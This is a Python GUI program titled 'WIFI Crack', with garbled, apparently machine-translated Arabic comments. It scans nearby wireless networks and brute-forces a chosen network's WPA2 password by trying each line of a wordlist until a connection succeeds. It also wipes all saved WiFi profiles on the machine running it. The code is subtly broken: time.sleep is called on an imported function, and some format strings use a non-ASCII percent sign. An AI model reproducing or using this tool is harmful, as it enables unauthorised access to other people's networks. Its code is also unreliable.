from tkinter import *
from tkinter import ttk
import pywifi
from pywifi import const
from time import sleep, time
import tkinter.filedialog  # فتح ملف التصفح في واجهة المستخدم الرسومية
import tkinter.messagebox  # فتح مربع تذكير رسالة tkiner


class MY_GUI():
    def __init__(self, init_window_name):
        self.init_window_name = init_window_name

        # مسار ملف كلمة المرور
        self.get_value = StringVar()  # تعيين محتوى متغير

        # احصل على حساب wifi الكراك
        self.get_wifi_value = StringVar()

        # احصل على كلمة مرور wifi
        self.get_wifimm_value = StringVar()

        self.wifi = pywifi.PyWiFi()  # واجهة شبكة انتزاع
        self.iface = self.wifi.interfaces()[0]  # احصل على أول بطاقة لاسلكية
        self.iface.disconnect()  # Test link افصل كل الروابط
        time.sleep(10)  # نائم لمدة ثانية واحدة
        # اختبر ما إذا كانت بطاقة الشبكة غير متصلة
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def __str__(self):
        # استدعاء الوظيفة تلقائيًا ، والعودة إلى بطاقة الشبكة الخاصة بها
        return '(WIFI:%s,%s)' % (self.wifi, self.iface.name())

    # إعداد النافذة
    def set_init_window(self):
        self.init_window_name.title("أداة WIFI Crack")
        self.init_window_name.geometry('+500+200')

        labelframe = LabelFrame(width=400, height=200,
                                text="التكوين")  # Framework ، تتم إضافة الكائنات التالية لـ labelframe
        labelframe.grid(column=0, row=0, padx=10, pady=10)

        self.search = Button(labelframe, text="البحث عن شبكات WiFi المجاورة", command=self.scans_wifi_list).grid(
            column=0, row=0)

        self.pojie = Button(labelframe, text="بدء التصدع", command=self.readPassWord).grid(column=1, row=0)

        self.label = Label(labelframe, text="مسار الدليل:").grid(column=0, row=1)

        self.path = Entry(labelframe, width=12, textvariable=self.get_value).grid(column=1, row=1)

        self.file = Button(labelframe, text="إضافة دليل ملف كلمة المرور", command=self.add_mm_file).grid(column=2,
                                                                                                         row=1)

        self.wifi_text = Label(labelframe, text="حساب WiFi:").grid(column=0, row=2)

        self.wifi_input = Entry(labelframe, width=12, textvariable=self.get_wifi_value).grid(column=1, row=2)

        self.wifi_mm_text = Label(labelframe, text="كلمة مرور WiFi:").grid(column=2, row=2)

        self.wifi_mm_input = Entry(labelframe, width=10, textvariable=self.get_wifimm_value).grid(column=3, row=2,
                                                                                                  sticky=W)

        self.wifi_labelframe = LabelFrame(text="قائمة واي فاي")
        self.wifi_labelframe.grid(column=0, row=3, columnspan=4, sticky=NSEW)

        # تحديد هيكل الشجرة وشريط التمرير
        self.wifi_tree = ttk.Treeview(self.wifi_labelframe, show="headings", columns=("a", "b", "c", "d"))
        self.vbar = ttk.Scrollbar(self.wifi_labelframe, orient=VERTICAL, command=self.wifi_tree.yview)
        self.wifi_tree.configure(yscrollcommand=self.vbar.set)

        # عنوان الجدول
        self.wifi_tree.column("a", width=50, anchor="center")
        self.wifi_tree.column("b", width=100, anchor="center")
        self.wifi_tree.column("c", width=100, anchor="center")
        self.wifi_tree.column("d", width=100, anchor="center")

        self.wifi_tree.heading("a", text="WiFiID")
        self.wifi_tree.heading("b", text="SSID")
        self.wifi_tree.heading("c", text="BSSID")
        self.wifi_tree.heading("d", text="signal")

        self.wifi_tree.grid(row=4, column=0, sticky=NSEW)
        self.wifi_tree.bind("<Double-1>", self.onDBClick)
        self.vbar.grid(row=4, column=1, sticky=NS)

    # بحث واي فاي
    # cmd /k C:\Python27\python.exe "$(FULL_CURRENT_PATH)" & PAUSE & EXIT
    def scans_wifi_list(self):  # مسح قائمة واي فاي المحيطة
        # بدء المسح
        print("^ _ ^ بدء فحص شبكات wifi القريبة ...")
        self.iface.scan()
        time.sleep(15)
        # احصل على نتائج المسح بعد بضع ثوان
        scanres = self.iface.scan_results()
        # عدد عدد النقاط الساخنة الموجودة في مكان قريب
        nums = len(scanres)
        print("الكمية:٪ s" % (nums))
        # print ("| %s |  %s |  %s | %s"%("WIFIID","SSID","BSSID","signal"))
        # البيانات الفعلية
        self.show_scans_wifi_list(scanres)
        return scanres

    # Show قائمة واي فاي
    def show_scans_wifi_list(self, scans_res):
        for index, wifi_info in enumerate(scans_res):
            # print("%-*s| %s | %*s |%*s\n"%(20,index,wifi_info.ssid,wifi_info.bssid,,wifi_info.signal))
            self.wifi_tree.insert("", 'end', values=(index + 1, wifi_info.ssid, wifi_info.bssid, wifi_info.signal))

    # print("| %s | %s | %s | %s \n"%(index,wifi_info.ssid,wifi_info.bssid,wifi_info.signal))

    # إضافة دليل ملف كلمة المرور
    def add_mm_file(self):
        self.filename = tkinter.filedialog.askopenfilename()
        self.get_value.set(self.filename)

    # Treeview حدث ربط
    def onDBClick(self, event):
        self.sels = event.widget.selection()
        self.get_wifi_value.set(self.wifi_tree.item(self.sels, "values")[1])

    # print("you clicked on",self.wifi_tree.item(self.sels,"values")[1])

    # اقرأ قاموس كلمة المرور لمطابقة
    def readPassWord(self):
        self.getFilePath = self.get_value.get()

        self.get_wifissid = self.get_wifi_value.get()

        pwdfilehander = open(self.getFilePath, "r", errors="ignore")
        while True:
            try:
                self.pwdStr = pwdfilehander.readline()

                if not self.pwdStr:
                    break
                self.bool1 = self.connect(self.pwdStr, self.get_wifissid)

                if self.bool1:
                    self.res = "=== الصحيح === اسم wifi:٪ s مطابق لكلمة المرور:٪ s" % (self.get_wifissid, self.pwdStr)
                    self.get_wifimm_value.set(self.pwdStr)
                    tkinter.messagebox.showinfo("نصائح", "الكراك الناجح! ! ! ")
                    print(self.res)
                    break
                else:
                    self.res = "--- خطأ --- اسم wifi:٪ s يطابق كلمة المرور:٪ s" % (self.get_wifissid, self.pwdStr)
                    print(self.res)
                sleep(3)
            except:
                continue

    # Match wifi وكلمة المرور
    def connect(self, pwd_Str, wifi_ssid):
        # Create wi_fi link file
        self.profile = pywifi.Profile()
        self.profile.ssid = wifi_ssid  # wifiName
        self.profile.auth = const.AUTH_ALG_OPEN  # فتح بطاقة الشبكة
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # خوارزمية تشفير wifi
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # وحدة التشفير
        self.profile.key = pwd_Str  # كلمة المرور
        self.iface.remove_all_network_profiles()  # حذف جميع ملفات wifi
        self.tmp_profile = self.iface.add_network_profile(self.profile)  # Set ملف ارتباط جديد
        self.iface.connect(self.tmp_profile)  # لينك
        time.sleep(5)
        if self.iface.status() == const.IFACE_CONNECTED:  # القاضي ما إذا كان سيتم الاتصال
            isOK = True
        else:
            isOK = False
        self.iface.disconnect()  # افصل
        time.sleep(1)
        # تحقق من حالة قطع الاتصال
        assert self.iface.status() in \
               [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
        return isOK


def gui_start():
    init_window = Tk()
    ui = MY_GUI(init_window)
    print(ui)
    ui.set_init_window()
    # ui.scans_wifi_list()

    init_window.mainloop()


gui_start()
